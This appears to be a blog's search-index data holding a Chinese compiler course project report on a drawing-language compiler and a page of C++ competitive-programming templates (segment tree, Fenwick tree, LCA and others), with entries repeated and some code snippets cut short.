(可选参数\"test\"测试词法分析器) ","date":"2022-11-22","objectID":"/articles/GraphCompiler/:0:2","series":null,"tags":null,"title":"编译原理大作业报告","uri":"/articles/GraphCompiler/#图形库依赖"},{"categories":null,"content":" 2. 开发环境及配置环境：GNU-g++ 9.4.0/Python 3.9 tkinter 文本编辑器：Visual Studio Code 构建工具：GNU make 代码仓库地址：https://github.com/zeroy0410/GraphCompiler 图形库依赖需要运行环境下存在Python以及tkinter图形库。 编译：在代码所在目录，运行命令： make 使用 ./GraphCompiler [ObjectFile] (可选参数\"test\"测试词法分析器) ","date":"2022-11-22","objectID":"/articles/GraphCompiler/:0:2","series":null,"tags":null,"title":"编译原理大作业报告","uri":"/articles/GraphCompiler/#编译"},{"categories":null,"content":" 2. 开发环境及配置环境：GNU-g++ 9.4.0/Python 3.9 tkinter 文本编辑器：Visual Studio Code 构建工具：GNU make 代码仓库地址：https://github.com/zeroy0410/GraphCompiler 图形库依赖需要运行环境下存在Python以及tkinter图形库。 编译：在代码所在目录，运行命令： make 使用 ./GraphCompiler [ObjectFile] (可选参数\"test\"测试词法分析器) ","date":"2022-11-22","objectID":"/articles/GraphCompiler/:0:2","series":null,"tags":null,"title":"编译原理大作业报告","uri":"/articles/GraphCompiler/#使用"},{"categories":null,"content":" 3. 基本原理与解决思路该项目由词法分析器（scanner）、语法分析器（parser）、语义分析器（semantic）组成。 词法分析器词法分析是计算机科学中将字符序列转换为记号（token）序列的过程。进行词法分析的程序或者函数叫作词法分析器（lexical analyzer，简称lexer），也叫扫描器（scanner）。词法分析器一般以函数的形式存在，供语法分析器调用。 本项目的记号如下表所示： enum Token_Type { ORIGIN /* 0 */, SCALE /* 1 */, ROT /* 2 */, IS /* 3 */, TO /* 4 */, STEP /* 5 */, DRAW /* 6 */, FOR /* 7 */, FROM /* 8 */, //保留字 T /* 9 */, //参数 SEMICO /* 10 */, L_BRACKET /* 11 */, R_BRACKET /* 12 */, COMMA /* 13 */, PLUS /* 14 */, MINUS /* 15 */, MUL /* 16 */, DIV /* 17 */, POWER /* 18 */, FUNC /*19 */, CONST_ID /* 20 */, NONTOKEN /* 21 */, ERRTOKEN /* 22 */ }; 存储Token的结构体如下所示： struct Token { Token_Type type; //记号类别 char *lexeme; //属性，字符串，指向char类型的指针 double value; //属性，常数的值，double型 double (*FuncPtr)(double); //属性，函数指针，代表一个指向返回double值并带有一个double形参的函数的指针的类型 }; 本词法分析器采用一次扫描，程序不断从文件中读入字符，通过分隔符（空格、换行符）等将输入切分成一个一个的单词，再与字典中的记号匹配，进行记号的识别。详细的识别方法见代码，相当于做了单词的切分。 语法分析器语法分析器将为句子构建语法树，同时检查程序的语法错误。报告错误的代码笔者将其封装为了一个errorReporter库以供整个项目调用，代码如下所示： extern void err_exit(const char *msg, const char *err, int err_code) { printf(\"Compiler fatal error: \"); printf(msg, err); puts(\"\\ncompilation terminated.\"); exit(err_code); } 语法分析器根据一定的文法接收并匹配词法分析器识别到的记号，文法如下所示： Expression ==\u003e Term{(plus | minus)Term} Term ==\u003e Factor{(mul | div)Factor} Factor ==\u003e Plus Factor | Minus Factor | Component Component==\u003e Atom[Power Component] Atom ==\u003e Const_ID | T | FUNC L_BRACKET Expression R_BRACKET | L_BRACKET Expression R_BRACKET 表达式的语法树如下所示： struct ExprNode{ Token_Type OpCode; union{ struct{//两个孩子的内部节点: 二元运算如PLUS, MUL等. 一元加, 一元减 ExprNode *Left, *Right; } CaseOperator; struct{//一个孩子的内部节点: 函数调用 ExprNode *Child; FuncPtr MathFuncPtr; }CaseFunc; double CaseConst; double *CaseParmPtr; }Content; }; 构建语法树的整体流程见代码parser.cpp。 整体算法流程如下： 语句的固定形式不外乎origin、scale、rot、for这几种，首先识别每条语句的开头Token，在分别匹配每种语句所需的Token，若能匹配则构建相应语法树，若不能则报告错误，代码如下所示： void parser() { FetchToken(); while (cur_token-\u003etype != NONTOKEN) { switch (cur_token-\u003etype) { case ORIGIN: origin_statement(); break; case SCALE: scale_statement(); break; case ROT: rot_statement(); break; case FOR: for_statement(); break; case T: break; case SEMICO: break; default: err_exit(\"\", \"\", -EFAULT); break; } MatchToken(SEMICO); } } 语义分析器笔者选择生成Python中间代码，并使用Python的tkinter图形库进行绘图。 语义分析器解析语法分析器构建的语法树，并负责中间代码生成。核心为： 表达式值的计算：深度优先后序遍历语法树 图形的绘制：画出每个坐标点 主要工作为： 从origin, rot, scale中得到坐标变换所需的信息 DrawLoop语句根据每一个值进行处理, 包括计算点的坐标, 进行坐标变换, 绘制出该点 同时设计DrawPixel、GetCoordinate等函数进行辅助。 详见semantic.cpp。 ","date":"2022-11-22","objectID":"/articles/GraphCompiler/:0:3","series":null,"tags":null,"title":"编译原理大作业报告","uri":"/articles/GraphCompiler/#3-基本原理与解决思路"},{"categories":null,"content":" 3. 基本原理与解决思路该项目由词法分析器（scanner）、语法分析器（parser）、语义分析器（semantic）组成。 词法分析器词法分析是计算机科学中将字符序列转换为记号（token）序列的过程。进行词法分析的程序或者函数叫作词法分析器（lexical analyzer，简称lexer），也叫扫描器（scanner）。词法分析器一般以函数的形式存在，供语法分析器调用。 本项目的记号如下表所示： enum Token_Type { ORIGIN /* 0 */, SCALE /* 1 */, ROT /* 2 */, IS /* 3 */, TO /* 4 */, STEP /* 5 */, DRAW /* 6 */, FOR /* 7 */, FROM /* 8 */, //保留字 T /* 9 */, //参数 SEMICO /* 10 */, L_BRACKET /* 11 */, R_BRACKET /* 12 */, COMMA /* 13 */, PLUS /* 14 */, MINUS /* 15 */, MUL /* 16 */, DIV /* 17 */, POWER /* 18 */, FUNC /*19 */, CONST_ID /* 20 */, NONTOKEN /* 21 */, ERRTOKEN /* 22 */ }; 存储Token的结构体如下所示： struct Token { Token_Type type; //记号类别 char *lexeme; //属性，字符串，指向char类型的指针 double value; //属性，常数的值，double型 double (*FuncPtr)(double); //属性，函数指针，代表一个指向返回double值并带有一个double形参的函数的指针的类型 }; 本词法分析器采用一次扫描，程序不断从文件中读入字符，通过分隔符（空格、换行符）等将输入切分成一个一个的单词，再与字典中的记号匹配，进行记号的识别。详细的识别方法见代码，相当于做了单词的切分。 语法分析器语法分析器将为句子构建语法树，同时检查程序的语法错误。报告错误的代码笔者将其封装为了一个errorReporter库以供整个项目调用，代码如下所示： extern void err_exit(const char *msg, const char *err, int err_code) { printf(\"Compiler fatal error: \"); printf(msg, err); puts(\"\\ncompilation terminated.\"); exit(err_code); } 语法分析器根据一定的文法接收并匹配词法分析器识别到的记号，文法如下所示： Expression ==\u003e Term{(plus | minus)Term} Term ==\u003e Factor{(mul | div)Factor} Factor ==\u003e Plus Factor | Minus Factor | Component Component==\u003e Atom[Power Component] Atom ==\u003e Const_ID | T | FUNC L_BRACKET Expression R_BRACKET | L_BRACKET Expression R_BRACKET 表达式的语法树如下所示： struct ExprNode{ Token_Type OpCode; union{ struct{//两个孩子的内部节点: 二元运算如PLUS, MUL等. 一元加, 一元减 ExprNode *Left, *Right; } CaseOperator; struct{//一个孩子的内部节点: 函数调用 ExprNode *Child; FuncPtr MathFuncPtr; }CaseFunc; double CaseConst; double *CaseParmPtr; }Content; }; 构建语法树的整体流程见代码parser.cpp。 整体算法流程如下： 语句的固定形式不外乎origin、scale、rot、for这几种，首先识别每条语句的开头Token，在分别匹配每种语句所需的Token，若能匹配则构建相应语法树，若不能则报告错误，代码如下所示： void parser() { FetchToken(); while (cur_token-\u003etype != NONTOKEN) { switch (cur_token-\u003etype) { case ORIGIN: origin_statement(); break; case SCALE: scale_statement(); break; case ROT: rot_statement(); break; case FOR: for_statement(); break; case T: break; case SEMICO: break; default: err_exit(\"\", \"\", -EFAULT); break; } MatchToken(SEMICO); } } 语义分析器笔者选择生成Python中间代码，并使用Python的tkinter图形库进行绘图。 语义分析器解析语法分析器构建的语法树，并负责中间代码生成。核心为： 表达式值的计算：深度优先后序遍历语法树 图形的绘制：画出每个坐标点 主要工作为： 从origin, rot, scale中得到坐标变换所需的信息 DrawLoop语句根据每一个值进行处理, 包括计算点的坐标, 进行坐标变换, 绘制出该点 同时设计DrawPixel、GetCoordinate等函数进行辅助。 详见semantic.cpp。 ","date":"2022-11-22","objectID":"/articles/GraphCompiler/:0:3","series":null,"tags":null,"title":"编译原理大作业报告","uri":"/articles/GraphCompiler/#词法分析器"},{"categories":null,"content":" 3. 基本原理与解决思路该项目由词法分析器（scanner）、语法分析器（parser）、语义分析器（semantic）组成。 词法分析器词法分析是计算机科学中将字符序列转换为记号（token）序列的过程。进行词法分析的程序或者函数叫作词法分析器（lexical analyzer，简称lexer），也叫扫描器（scanner）。词法分析器一般以函数的形式存在，供语法分析器调用。 本项目的记号如下表所示： enum Token_Type { ORIGIN /* 0 */, SCALE /* 1 */, ROT /* 2 */, IS /* 3 */, TO /* 4 */, STEP /* 5 */, DRAW /* 6 */, FOR /* 7 */, FROM /* 8 */, //保留字 T /* 9 */, //参数 SEMICO /* 10 */, L_BRACKET /* 11 */, R_BRACKET /* 12 */, COMMA /* 13 */, PLUS /* 14 */, MINUS /* 15 */, MUL /* 16 */, DIV /* 17 */, POWER /* 18 */, FUNC /*19 */, CONST_ID /* 20 */, NONTOKEN /* 21 */, ERRTOKEN /* 22 */ }; 存储Token的结构体如下所示： struct Token { Token_Type type; //记号类别 char *lexeme; //属性，字符串，指向char类型的指针 double value; //属性，常数的值，double型 double (*FuncPtr)(double); //属性，函数指针，代表一个指向返回double值并带有一个double形参的函数的指针的类型 }; 本词法分析器采用一次扫描，程序不断从文件中读入字符，通过分隔符（空格、换行符）等将输入切分成一个一个的单词，再与字典中的记号匹配，进行记号的识别。详细的识别方法见代码，相当于做了单词的切分。 语法分析器语法分析器将为句子构建语法树，同时检查程序的语法错误。报告错误的代码笔者将其封装为了一个errorReporter库以供整个项目调用，代码如下所示： extern void err_exit(const char *msg, const char *err, int err_code) { printf(\"Compiler fatal error: \"); printf(msg, err); puts(\"\\ncompilation terminated.\"); exit(err_code); } 语法分析器根据一定的文法接收并匹配词法分析器识别到的记号，文法如下所示： Expression ==\u003e Term{(plus | minus)Term} Term ==\u003e Factor{(mul | div)Factor} Factor ==\u003e Plus Factor | Minus Factor | Component Component==\u003e Atom[Power Component] Atom ==\u003e Const_ID | T | FUNC L_BRACKET Expression R_BRACKET | L_BRACKET Expression R_BRACKET 表达式的语法树如下所示： struct ExprNode{ Token_Type OpCode; union{ struct{//两个孩子的内部节点: 二元运算如PLUS, MUL等. 一元加, 一元减 ExprNode *Left, *Right; } CaseOperator; struct{//一个孩子的内部节点: 函数调用 ExprNode *Child; FuncPtr MathFuncPtr; }CaseFunc; double CaseConst; double *CaseParmPtr; }Content; }; 构建语法树的整体流程见代码parser.cpp。 整体算法流程如下： 语句的固定形式不外乎origin、scale、rot、for这几种，首先识别每条语句的开头Token，在分别匹配每种语句所需的Token，若能匹配则构建相应语法树，若不能则报告错误，代码如下所示： void parser() { FetchToken(); while (cur_token-\u003etype != NONTOKEN) { switch (cur_token-\u003etype) { case ORIGIN: origin_statement(); break; case SCALE: scale_statement(); break; case ROT: rot_statement(); break; case FOR: for_statement(); break; case T: break; case SEMICO: break; default: err_exit(\"\", \"\", -EFAULT); break; } MatchToken(SEMICO); } } 语义分析器笔者选择生成Python中间代码，并使用Python的tkinter图形库进行绘图。 语义分析器解析语法分析器构建的语法树，并负责中间代码生成。核心为： 表达式值的计算：深度优先后序遍历语法树 图形的绘制：画出每个坐标点 主要工作为： 从origin, rot, scale中得到坐标变换所需的信息 DrawLoop语句根据每一个值进行处理, 包括计算点的坐标, 进行坐标变换, 绘制出该点 同时设计DrawPixel、GetCoordinate等函数进行辅助。 详见semantic.cpp。 ","date":"2022-11-22","objectID":"/articles/GraphCompiler/:0:3","series":null,"tags":null,"title":"编译原理大作业报告","uri":"/articles/GraphCompiler/#语法分析器"},{"categories":null,"content":" 3. 基本原理与解决思路该项目由词法分析器（scanner）、语法分析器（parser）、语义分析器（semantic）组成。 词法分析器词法分析是计算机科学中将字符序列转换为记号（token）序列的过程。进行词法分析的程序或者函数叫作词法分析器（lexical analyzer，简称lexer），也叫扫描器（scanner）。词法分析器一般以函数的形式存在，供语法分析器调用。 本项目的记号如下表所示： enum Token_Type { ORIGIN /* 0 */, SCALE /* 1 */, ROT /* 2 */, IS /* 3 */, TO /* 4 */, STEP /* 5 */, DRAW /* 6 */, FOR /* 7 */, FROM /* 8 */, //保留字 T /* 9 */, //参数 SEMICO /* 10 */, L_BRACKET /* 11 */, R_BRACKET /* 12 */, COMMA /* 13 */, PLUS /* 14 */, MINUS /* 15 */, MUL /* 16 */, DIV /* 17 */, POWER /* 18 */, FUNC /*19 */, CONST_ID /* 20 */, NONTOKEN /* 21 */, ERRTOKEN /* 22 */ }; 存储Token的结构体如下所示： struct Token { Token_Type type; //记号类别 char *lexeme; //属性，字符串，指向char类型的指针 double value; //属性，常数的值，double型 double (*FuncPtr)(double); //属性，函数指针，代表一个指向返回double值并带有一个double形参的函数的指针的类型 }; 本词法分析器采用一次扫描，程序不断从文件中读入字符，通过分隔符（空格、换行符）等将输入切分成一个一个的单词，再与字典中的记号匹配，进行记号的识别。详细的识别方法见代码，相当于做了单词的切分。 语法分析器语法分析器将为句子构建语法树，同时检查程序的语法错误。报告错误的代码笔者将其封装为了一个errorReporter库以供整个项目调用，代码如下所示： extern void err_exit(const char *msg, const char *err, int err_code) { printf(\"Compiler fatal error: \"); printf(msg, err); puts(\"\\ncompilation terminated.\"); exit(err_code); } 语法分析器根据一定的文法接收并匹配词法分析器识别到的记号，文法如下所示： Expression ==\u003e Term{(plus | minus)Term} Term ==\u003e Factor{(mul | div)Factor} Factor ==\u003e Plus Factor | Minus Factor | Component Component==\u003e Atom[Power Component] Atom ==\u003e Const_ID | T | FUNC L_BRACKET Expression R_BRACKET | L_BRACKET Expression R_BRACKET 表达式的语法树如下所示： struct ExprNode{ Token_Type OpCode; union{ struct{//两个孩子的内部节点: 二元运算如PLUS, MUL等. 一元加, 一元减 ExprNode *Left, *Right; } CaseOperator; struct{//一个孩子的内部节点: 函数调用 ExprNode *Child; FuncPtr MathFuncPtr; }CaseFunc; double CaseConst; double *CaseParmPtr; }Content; }; 构建语法树的整体流程见代码parser.cpp。 整体算法流程如下： 语句的固定形式不外乎origin、scale、rot、for这几种，首先识别每条语句的开头Token，在分别匹配每种语句所需的Token，若能匹配则构建相应语法树，若不能则报告错误，代码如下所示： void parser() { FetchToken(); while (cur_token-\u003etype != NONTOKEN) { switch (cur_token-\u003etype) { case ORIGIN: origin_statement(); break; case SCALE: scale_statement(); break; case ROT: rot_statement(); break; case FOR: for_statement(); break; case T: break; case SEMICO: break; default: err_exit(\"\", \"\", -EFAULT); break; } MatchToken(SEMICO); } } 语义分析器笔者选择生成Python中间代码，并使用Python的tkinter图形库进行绘图。 语义分析器解析语法分析器构建的语法树，并负责中间代码生成。核心为： 表达式值的计算：深度优先后序遍历语法树 图形的绘制：画出每个坐标点 主要工作为： 从origin, rot, scale中得到坐标变换所需的信息 DrawLoop语句根据每一个值进行处理, 包括计算点的坐标, 进行坐标变换, 绘制出该点 同时设计DrawPixel、GetCoordinate等函数进行辅助。 详见semantic.cpp。 ","date":"2022-11-22","objectID":"/articles/GraphCompiler/:0:3","series":null,"tags":null,"title":"编译原理大作业报告","uri":"/articles/GraphCompiler/#语义分析器"},{"categories":null,"content":" 4. 关键类及主要方法 词法分析器Token_Type：枚举类型，表示记号的分类。 Token_Tab：字典。 Token：用来存储记号的数据结构。 InitScanner()：初始化词法分析器。 GetToken()：从输入文件中获取一个记号。 CloseScanner()：关闭词法分析器。 语法分析器ExprNode：存储语法树结点的数据结构。 MakeExprNode：制作一个语法树节点。 atom()：匹配Atom文法。 component()：匹配Component文法。 factor()：匹配Factor文法。 term()：匹配Term文法。 expression()：匹配Expression文法。 FetchToken()：从词法分析器中获取一个记号，若是错误记号，报错。 MatchToken()：匹配记号，若不匹配，报错。 origin_statement()：处理Origin语句（scale_statement、rot_statement、for_statement）同理。 parser()：语法分析器暴露给main的接口。 语义分析器GetExprVal()：计算表达式树的值。 DrawLoop()：生成绘制函数的Python代码（此项目中此代码为中间代码）。 CloseDrawer()：关闭绘图。 DrawPixel()：绘制一个点。 GetCoordinate()：计算绘制点的坐标。 ","date":"2022-11-22","objectID":"/articles/GraphCompiler/:0:4","series":null,"tags":null,"title":"编译原理大作业报告","uri":"/articles/GraphCompiler/#4-关键类及主要方法"},{"categories":null,"content":" 4. 关键类及主要方法 词法分析器Token_Type：枚举类型，表示记号的分类。 Token_Tab：字典。 Token：用来存储记号的数据结构。 InitScanner()：初始化词法分析器。 GetToken()：从输入文件中获取一个记号。 CloseScanner()：关闭词法分析器。 语法分析器ExprNode：存储语法树结点的数据结构。 MakeExprNode：制作一个语法树节点。 atom()：匹配Atom文法。 component()：匹配Component文法。 factor()：匹配Factor文法。 term()：匹配Term文法。 expression()：匹配Expression文法。 FetchToken()：从词法分析器中获取一个记号，若是错误记号，报错。 MatchToken()：匹配记号，若不匹配，报错。 origin_statement()：处理Origin语句（scale_statement、rot_statement、for_statement）同理。 parser()：语法分析器暴露给main的接口。 语义分析器GetExprVal()：计算表达式树的值。 DrawLoop()：生成绘制函数的Python代码（此项目中此代码为中间代码）。 CloseDrawer()：关闭绘图。 DrawPixel()：绘制一个点。 GetCoordinate()：计算绘制点的坐标。 ","date":"2022-11-22","objectID":"/articles/GraphCompiler/:0:4","series":null,"tags":null,"title":"编译原理大作业报告","uri":"/articles/GraphCompiler/#词法分析器-1"},{"categories":null,"content":" 4. 关键类及主要方法 词法分析器Token_Type：枚举类型，表示记号的分类。 Token_Tab：字典。 Token：用来存储记号的数据结构。 InitScanner()：初始化词法分析器。 GetToken()：从输入文件中获取一个记号。 CloseScanner()：关闭词法分析器。 语法分析器ExprNode：存储语法树结点的数据结构。 MakeExprNode：制作一个语法树节点。 atom()：匹配Atom文法。 component()：匹配Component文法。 factor()：匹配Factor文法。 term()：匹配Term文法。 expression()：匹配Expression文法。 FetchToken()：从词法分析器中获取一个记号，若是错误记号，报错。 MatchToken()：匹配记号，若不匹配，报错。 origin_statement()：处理Origin语句（scale_statement、rot_statement、for_statement）同理。 parser()：语法分析器暴露给main的接口。 语义分析器GetExprVal()：计算表达式树的值。 DrawLoop()：生成绘制函数的Python代码（此项目中此代码为中间代码）。 CloseDrawer()：关闭绘图。 DrawPixel()：绘制一个点。 GetCoordinate()：计算绘制点的坐标。 ","date":"2022-11-22","objectID":"/articles/GraphCompiler/:0:4","series":null,"tags":null,"title":"编译原理大作业报告","uri":"/articles/GraphCompiler/#语法分析器-1"},{"categories":null,"content":" 4. 关键类及主要方法 词法分析器Token_Type：枚举类型，表示记号的分类。 Token_Tab：字典。 Token：用来存储记号的数据结构。 InitScanner()：初始化词法分析器。 GetToken()：从输入文件中获取一个记号。 CloseScanner()：关闭词法分析器。 语法分析器ExprNode：存储语法树结点的数据结构。 MakeExprNode：制作一个语法树节点。 atom()：匹配Atom文法。 component()：匹配Component文法。 factor()：匹配Factor文法。 term()：匹配Term文法。 expression()：匹配Expression文法。 FetchToken()：从词法分析器中获取一个记号，若是错误记号，报错。 MatchToken()：匹配记号，若不匹配，报错。 origin_statement()：处理Origin语句（scale_statement、rot_statement、for_statement）同理。 parser()：语法分析器暴露给main的接口。 语义分析器GetExprVal()：计算表达式树的值。 DrawLoop()：生成绘制函数的Python代码（此项目中此代码为中间代码）。 CloseDrawer()：关闭绘图。 DrawPixel()：绘制一个点。 GetCoordinate()：计算绘制点的坐标。 ","date":"2022-11-22","objectID":"/articles/GraphCompiler/:0:4","series":null,"tags":null,"title":"编译原理大作业报告","uri":"/articles/GraphCompiler/#语义分析器-1"},{"categories":null,"content":" 5. 测试截图 ","date":"2022-11-22","objectID":"/articles/GraphCompiler/:0:5","series":null,"tags":null,"title":"编译原理大作业报告","uri":"/articles/GraphCompiler/#5-测试截图"},{"categories":null,"content":" 6. 总结体会此次编译原理实验我收获颇丰。只有自己亲自完成整个过程才能对课本上的知识有着深入而直观的了解。在完成实验的过程中，我实践了词法分析、语法分析、语义分析的算法流程，提升了自己的工程能力。 ","date":"2022-11-22","objectID":"/articles/GraphCompiler/:0:6","series":null,"tags":null,"title":"编译原理大作业报告","uri":"/articles/GraphCompiler/#6-总结体会"},{"categories":null,"content":" @zeroy.site ","date":"2022-05-20","objectID":"/articles/templates/:0:0","series":null,"tags":null,"title":"Templates","uri":"/articles/templates/#"},{"categories":null,"content":" 读入输出挂 inline int read(){ char c=getchar(); int num=0,fl=1; while(c\u003c48 || c\u003e57){if(c=='-')fl=-1;c=getchar();} while(c\u003e=48 \u0026\u0026 c\u003c=57){num=(num\u003c\u003c1)+(num\u003c\u003c3)+(c^48);c=getchar();} return num*fl; } inline void write(int x){ if(x\u003c0){ putchar('-'); x=-x; } if(x\u003e9)write(x/10); putchar(x%10+'0'); } ","date":"2022-05-20","objectID":"/articles/templates/:0:1","series":null,"tags":null,"title":"Templates","uri":"/articles/templates/#读入输出挂"},{"categories":null,"content":" 正向表 int tot=0,h[M]; struct edge{ int nxt; int to,cost; }G[3*M]; void add(int a,int b,int c){ G[++tot]=(edge){h[a],b,c}; h[a]=tot; } //图论题存图用的 //遍历： for(int i=h[x];i;i=G[i].nxt){ int u=G[i].to,v=G[i].cost; //... } ","date":"2022-05-20","objectID":"/articles/templates/:0:2","series":null,"tags":null,"title":"Templates","uri":"/articles/templates/#正向表"},{"categories":null,"content":" 基础数据结构 树状数组 void Add(int x,int d){ while(x\u003c=n){ C[x]+=d; x+=(x\u0026-x); } } int Sum(int x){ int res=0; while(x){ res+=C[x]; x-=(x\u0026-x); } return res; } //在线单点加值，查询前缀和，单次操作复杂度均为O(logn) ST表预处理 void Init_RMQ(int n){ for(int i=1;i\u003c=n;i++)f[i][0]=A[i]; lg2[1]=0; for(int i=2;i\u003c=n;i++)lg2[i]=lg2[i\u003e\u003e1]+1; for(int j=1;(1\u003c\u003cj)\u003c=n;j++) for(int i=1;i+(1\u003c\u003cj)-1\u003c=n;i++) f[i][j]=max(f[i][j-1],f[i+(1\u003c\u003c(j-1))][j-1]); } 查询 int query(int l,int r){ int k=lg2[r-l+1]; return max(f[l][k],f[r-(1\u003c\u003ck)+1][k]); } //预处理复杂度为O(nlogn),单次查询复杂度为O(1) 线段树 struct Segment_tree{ #define fa tree[p] #define lson tree[p\u003c\u003c1] #define rson tree[p\u003c\u003c1|1] struct node{ int l,r; LL add;//懒标记 LL sum; int len(){return r-l+1;} }tree[M\u003c\u003c2]; void up(int p){ fa.sum=lson.sum+rson.sum; } void down(int p){ if(fa.add==0)return; lson.add+=fa.add; lson.sum+=fa.add*lson.len(); rson.add+=fa.add; rson.sum+=fa.add*rson.len(); fa.add=0; } void build(int l,int r,int p){ fa.l=l;fa.r=r;fa.sum=fa.add=0; if(l==r){fa.sum=A[l];return;} int mid=(l+r)\u003e\u003e1; build(l,mid,p\u003c\u003c1); build(mid+1,r,p\u003c\u003c1|1); up(p); } void update(int l,int r,LL d,int p){ if(fa.l==l\u0026\u0026fa.r==r){ fa.sum+=1LL*fa.len()*d; fa.add+=d; return; } int mid=(fa.l+fa.r)\u003e\u003e1; down(p); if(r\u003c=mid)update(l,r,d,p\u003c\u003c1); else if(l\u003emid)update(l,r,d,p\u003c\u003c1|1); else { update(l,mid,d,p\u003c\u003c1); update(mid+1,r,d,p\u003c\u003c1|1); } up(p); } LL query(int l,int r,int p){ if(fa.l==l\u0026\u0026fa.r==r)return fa.sum; down(p); int mid=(fa.l+fa.r)\u003e\u003e1; if(r\u003c=mid)return query(l,r,p\u003c\u003c1); else if(l\u003emid)return query(l,r,p\u003c\u003c1|1); return query(l,mid,p\u003c\u003c1)+query(mid+1,r,p\u003c\u003c1|1); } }T; //区间加减，区间查询和，单次操作复杂度均为O(logn) //可实现的变种：区间乘积，区间染色问题等等。 并查集 int getfa(int x){ return fa[x]==x?x:fa[x]=getfa(fa[x]); } //初始状态下所有fa[x]=x void Union(int x,int y){//两个集合合并 fa[getfa(x)]=getfa(y); } ","date":"2022-05-20","objectID":"/articles/templates/:0:3","series":null,"tags":null,"title":"Templates","uri":"/articles/templates/#基础数据结构"},{"categories":null,"content":" 基础数据结构 树状数组 void Add(int x,int d){ while(x\u003c=n){ C[x]+=d; x+=(x\u0026-x); } } int Sum(int x){ int res=0; while(x){ res+=C[x]; x-=(x\u0026-x); } return res; } //在线单点加值，查询前缀和，单次操作复杂度均为O(logn) ST表预处理 void Init_RMQ(int n){ for(int i=1;i\u003c=n;i++)f[i][0]=A[i]; lg2[1]=0; for(int i=2;i\u003c=n;i++)lg2[i]=lg2[i\u003e\u003e1]+1; for(int j=1;(1\u003c","date":"2022-05-20","objectID":"/articles/templates/:0:3","series":null,"tags":null,"title":"Templates","uri":"/articles/templates/#树状数组"},{"categories":null,"content":" 基础数据结构 树状数组 void Add(int x,int d){ while(x\u003c=n){ C[x]+=d; x+=(x\u0026-x); } } int Sum(int x){ int res=0; while(x){ res+=C[x]; x-=(x\u0026-x); } return res; } //在线单点加值，查询前缀和，单次操作复杂度均为O(logn) ST表预处理 void Init_RMQ(int n){ for(int i=1;i\u003c=n;i++)f[i][0]=A[i]; lg2[1]=0; for(int i=2;i\u003c=n;i++)lg2[i]=lg2[i\u003e\u003e1]+1; for(int j=1;(1\u003c","date":"2022-05-20","objectID":"/articles/templates/:0:3","series":null,"tags":null,"title":"Templates","uri":"/articles/templates/#st表"},{"categories":null,"content":" 基础数据结构 树状数组 void Add(int x,int d){ while(x\u003c=n){ C[x]+=d; x+=(x\u0026-x); } } int Sum(int x){ int res=0; while(x){ res+=C[x]; x-=(x\u0026-x); } return res; } //在线单点加值，查询前缀和，单次操作复杂度均为O(logn) ST表预处理 void Init_RMQ(int n){ for(int i=1;i\u003c=n;i++)f[i][0]=A[i]; lg2[1]=0; for(int i=2;i\u003c=n;i++)lg2[i]=lg2[i\u003e\u003e1]+1; for(int j=1;(1\u003c","date":"2022-05-20","objectID":"/articles/templates/:0:3","series":null,"tags":null,"title":"Templates","uri":"/articles/templates/#线段树"},{"categories":null,"content":" 基础数据结构 树状数组 void Add(int x,int d){ while(x\u003c=n){ C[x]+=d; x+=(x\u0026-x); } } int Sum(int x){ int res=0; while(x){ res+=C[x]; x-=(x\u0026-x); } return res; } //在线单点加值，查询前缀和，单次操作复杂度均为O(logn) ST表预处理 void Init_RMQ(int n){ for(int i=1;i\u003c=n;i++)f[i][0]=A[i]; lg2[1]=0; for(int i=2;i\u003c=n;i++)lg2[i]=lg2[i\u003e\u003e1]+1; for(int j=1;(1\u003c","date":"2022-05-20","objectID":"/articles/templates/:0:3","series":null,"tags":null,"title":"Templates","uri":"/articles/templates/#并查集"},{"categories":null,"content":" 树上算法 LCA跳重链 void dfs(int x,int f,int d){ dep[x]=d; sz[x]=1; fa[x]=f;son[x]=0; for(int i=0;i\u003cG[x].size();i++){ int u=G[x][i]; if(u==f)continue; dfs(u,x,d+1); if(sz[u]\u003esz[son[x]])son[x]=u; sz[x]+=sz[u]; } } void dfs_top(int x,int tp){ top[x]=tp; if(son[x])dfs_top(son[x],tp); for(int i=0;i\u003cG[x].size();i++){ int u=G[x][i]; if(u==fa[x]||u==son[x])continue; dfs_top(u,u); } } int LCA(int a,int b){ while(top[a]!=top[b]){ if(dep[top[a]]\u003edep[top[b]])a=fa[top[a]]; else b=fa[top[b]]; } return dep[a]\u003edep[b]?b:a; } 倍增 void dfs(int x,int f,int d){ dep[x]=d; fa[x][0]=f; for(int i=0;i\u003cG[x].size();i++){ int u=G[x][i]; if(u==f)continue; dfs(u,x,d+1); } } int LCA(int a,int b){ if(dep[a]\u003edep[b])swap(a,b); int step=dep[b]-dep[a]; for(int i=19;i\u003e=0;i--) if(step\u00261\u003c\u003ci)b=fa[b][i]; if(a==b)return a; for(int i=19;i\u003e=0;i--) if(fa[a][i]!=fa[b][i])a=fa[a][i],b=fa[b][i]; return fa[a][0]; } for(int j=1;j\u003c=19;j++) for(int i=1;i\u003c=n;i++) fa[i][j]=fa[fa[i][j-1]][j-1]; 树链剖分寻找重儿子 void dfs(int x,int f,int d){ dep[x]=d;fa[x]=f;sz[x]=1;son[x]=0; for(int i=h[x];i;i=G[i].nxt){ int u=G[i].to; if(u==f)continue; dfs(u,x,d+1); if(sz[u]\u003esz[son[x]])son[x]=u; sz[x]+=sz[u]; } } 处理top void dfs_top(int x,int tp){ top[x]=tp;ID[x]=++tt;ln[tt]=x; if(son[x])dfs_top(son[x],tp); for(int i=h[x];i;i=G[i].nxt){ int u=G[i].to; if(u==son[x]||u==fa[x])continue; dfs_top(u,u); } } query while(top[u]!=top[v]){ if(dep[top[u]]\u003edep[top[v]]){ query(ID[top[u]],ID[u],1); u=fa[top[u]]; } else { query(ID[top[v]],ID[v],1); v=fa[top[v]]; } } if(dep[u]\u003edep[v])query(ID[v],ID[u],1); else query(ID[u],ID[v],1); ","date":"2022-05-20","objectID":"/articles/templates/:0:4","series":null,"tags":null,"title":"Templates","uri":"/articles/templates/#树上算法"},{"categories":null,"content":" 树上算法 LCA跳重链 void dfs(int x,int f,int d){ dep[x]=d; sz[x]=1; fa[x]=f;son[x]=0; for(int i=0;isz[son[x]])son[x]=u; sz[x]+=sz[u]; } } void dfs_top(int x,int tp){ top[x]=tp; if(son[x])dfs_top(son[x],tp); for(int i=0;idep[top[b]])a=fa[top[a]]; else b=fa[top[b]]; } return dep[a]\u003edep[b]?b:a; } 倍增 void dfs(int x,int f,int d){ dep[x]=d; fa[x][0]=f; for(int i=0;idep[b])swap(a,b); int step=dep[b]-dep[a]; for(int i=19;i\u003e=0;i--) if(step\u00261\u003c=0;i--) if(fa[a][i]!=fa[b][i])a=fa[a][i],b=fa[b][i]; return 